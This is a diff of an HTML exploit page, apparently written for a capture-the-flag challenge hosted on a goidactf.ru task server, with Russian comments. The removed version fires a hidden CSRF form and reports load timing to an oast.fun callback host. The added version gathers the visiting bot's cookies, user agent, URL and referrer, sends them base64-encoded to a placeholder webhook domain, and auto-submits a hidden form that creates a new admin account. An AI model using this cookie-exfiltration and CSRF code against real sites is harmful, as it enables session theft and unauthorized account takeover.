@@ -1,30 +1,42 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <body>
-
-<iframe name="sink" style="display:none"></iframe>
-
-<form id="f"
-  action="https://tasks.goidactf.ru:20199/create_admin"
-  method="POST"
-  target="sink">
-  <input type="hidden" name="new_admin_login" value="ctfadmin">
-</form>
-
 <script>
-window.onload = () => {
-  const t0 = Date.now();
-  const frame = document.getElementsByName("sink")[0];
-
-  frame.onload = () => {
-    const delta = Date.now() - t0;
-    location.href =
-      "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/loaded_" + delta;
-  };
-
-  document.getElementById("f").submit();
+/* 1) собираем максимум доступной инфы */
+const botInfo = {
+  cookies: document.cookie,            // если не httpOnly — утекут
+  userAgent: navigator.userAgent,
+  platform: navigator.platform,
+  language: navigator.language,
+  timestamp: new Date().toISOString(),
+  location: window.location.href,
+  referrer: document.referrer
 };
-</script>
 
+/* 2) кодируем (НЕ для DNS, а для webhook — можно) */
+const encodedInfo = btoa(JSON.stringify(botInfo));
+
+/* 3) эксфиль всего тела через webhook */
+new Image().src =
+  "https://WEBHOOK.YOUR.DOMAIN/?info=" +
+  encodeURIComponent(encodedInfo);
+
+/* 4) CSRF: создаём админа */
+const form = document.createElement("form");
+form.method = "POST";
+form.action = "https://tasks.goidactf.ru:20198/create_admin";
+form.style.display = "none";
+
+const input = document.createElement("input");
+input.type = "hidden";
+input.name = "new_admin_login";
+input.value = "ctfadmin_" + Date.now();
+
+form.appendChild(input);
+document.body.appendChild(form);
+
+/* 5) отправляем */
+form.submit();
+</script>
 </body>
 </html>
